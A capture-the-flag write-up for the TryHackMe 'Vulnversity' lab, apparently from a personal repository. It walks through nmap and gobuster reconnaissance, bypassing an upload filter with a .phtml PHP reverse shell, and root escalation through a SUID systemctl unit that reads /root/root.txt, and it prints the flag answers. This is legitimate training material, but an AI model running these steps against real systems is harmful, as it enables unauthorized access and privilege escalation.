# Vulnversity

## Task 1 - Deploy the Machine
1. Deploy the machine
```
expot IP= 10.10.188.112
```

## Task 2 - Reconnaissance
2. Scan the box, how many ports are open?
```
6
```
```bash
jeffrowell@kali:~/Documents/TryHackMe/Vulnversity$ nmap -sC -sV -Pn -n $IP -oN nmap/initial.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 21:49 MDT
Nmap scan report for 10.10.188.112
Host is up (0.14s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h19m34s, deviation: 2h18m34s, median: -25s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-05-15T23:49:28-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-16T03:49:28
|_  start_date: N/A
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.30 seconds
```

3. What version of the squid proxy is running on the machine?
```
3.5.12
```

4. How many ports will nmap scan if the flag -p-400 was used?
```
400
```

5. Using the nmap flag -n what will it not resolve?
```
DNS
```

6. What is the most likely operating system this machine is running?
```
Ubuntu
```
```bash
jeffrowell@kali:~/Documents/TryHackMe/Vulnversity$ sudo nmap -sC -sV -O -Pn -n $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 21:56 MDT
Nmap scan report for 10.10.188.112
Host is up (0.13s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/15%OT=21%CT=1%CU=39828%PV=Y%DS=2%DC=I%G=Y%TM=5EBF64B
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)
Network Distance: 2 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h19m34s, deviation: 2h18m34s, median: -25s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-05-15T23:57:08-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-16T03:57:08
|_  start_date: N/A
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.50 seconds```
```

7. What port is the web server running on?
```
3333
```

8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)


## Task 3 - Locating Directories using GoBuster
1. Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.
```bash
jeffrowell@kali:~/Documents/TryHackMe/Vulnversity$ gobuster dir -u http://10.10.188.112:3333/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.188.112:3333/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/15 21:54:36 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/15 21:55:42 Finished
===============================================================
```

2. What is the directory that has an upload form page?
```
/internal/
```

## Task 4 - Compromise the Webserver
1.  Try upload a few file types to the server, what common extension seems to be blocked?
```
.php
```

3. To identify which extensions are not blocked, we're going to fuzz the upload form.
```
.phtml
```
Using Burpsuite, we can leverage the intruder to fuzz the file extensions:
![Screenshot_2020-05-15_22-25-18](https://user-images.githubusercontent.com/32188816/82110366-07cc2b00-96fb-11ea-9ed6-4a7daeb84aa8.png)
As we can see, `.phtml` is the only common php file extension that wasn't blocked.

4. Now we know what extension we can use for our payload we can progress. We are going to use a PHP reverse shell as our payload.
Uploading our PHP reverse shell as a `.phtml` file was successfull, and can be verified by going to the `/internal/uploads` directory that we found from running gobuster on `/internal`. After we catch the shell we are given a basic user, who has the user flag in the home directory:
```bash$ pwd
/
$ ls /home
bill
$ cd /home/bill
$ ls
user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

5. What user was running the web server?
```
bill
```

6. What is the user flag?
```
8bd7992fbe8a6ad22a63361004cfcedb
```

### Task 5 - Privelege Escalation
1. On the system, search for all SUID files. What file stands out?
```
/bin/systemctl
```
```bash
$ find / -perm -4000 2>/dev/null
    .
    .
    .
/bin/systemctl
    .
    .
    .
```
We could have also used `linpeas` to find the same thing.

2. Become root and get the last flag (/root/root.txt)
Curtosy of GTFOBins, we can leverage `systemctl` to run commands as root like this:
```bash
www-data@vulnuniversity:/$ TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag"
[Install]
WantedBy=multi-user.target' > $TFTF=$(mktemp).service
www-data@vulnuniversity:/$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag"
> [Install]
>
WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/$ /bin/systemctl link $TF
/bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.DVrMPStkHt.service to /tmp/tmp.DVrMPStkHt.service.
www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.DVrMPStkHt.service to /tmp/tmp.DVrMPStkHt.service.
www-data@vulnuniversity:/$ cat /tmp/root_flag
cat /tmp/root_flag
a58ff8579f0a9270368d33a9966c7fd5
www-data@vulnuniversity:/$
```
